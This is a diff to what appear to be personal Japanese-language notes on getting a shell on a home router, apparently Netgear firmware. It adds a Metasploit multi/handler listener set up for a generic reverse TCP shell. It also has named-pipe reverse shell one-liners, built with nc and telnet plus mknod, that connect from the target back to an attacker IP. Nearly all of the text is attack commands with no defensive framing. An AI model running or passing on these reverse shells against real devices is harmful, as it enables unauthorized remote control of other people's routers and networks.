@@ -154,3 +154,29 @@ mknod /tmp/p p
 
 # 2. パイプ経由で ./nc_arm32 にシェルを流し込む
 cat /tmp/p | /bin/sh -i 2>&1 | ./nc_arm32 192.168.0.2 4443 > /tmp/p
+
+---------------------------------------------------------------------------------------------
+ng R66250-v1.0.4.8.10.1.13
+
+
+msfconsole
+
+telnetとmknodがある条件
+
+msf6 exploit(multi/handler) > set AutoVerifySession false
+msf6 exploit(multi/handler) > set StageEncoderSkipForPayload true
+
+なんでもうけとる
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.100
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > set AutoVerifySession false
+msf6 exploit(multi/handler) > run
+
+mknod /tmp/p p && telnet 192.168.1.2 4443 0</tmp/p | /bin/ash 1>/tmp/p
+# ターゲット側（攻撃者へ接続を発信）
+mknod /tmp/p p && telnet <攻撃者IP> 4444 0</tmp/p | /bin/sh 1>/tmp/p
+
+
+
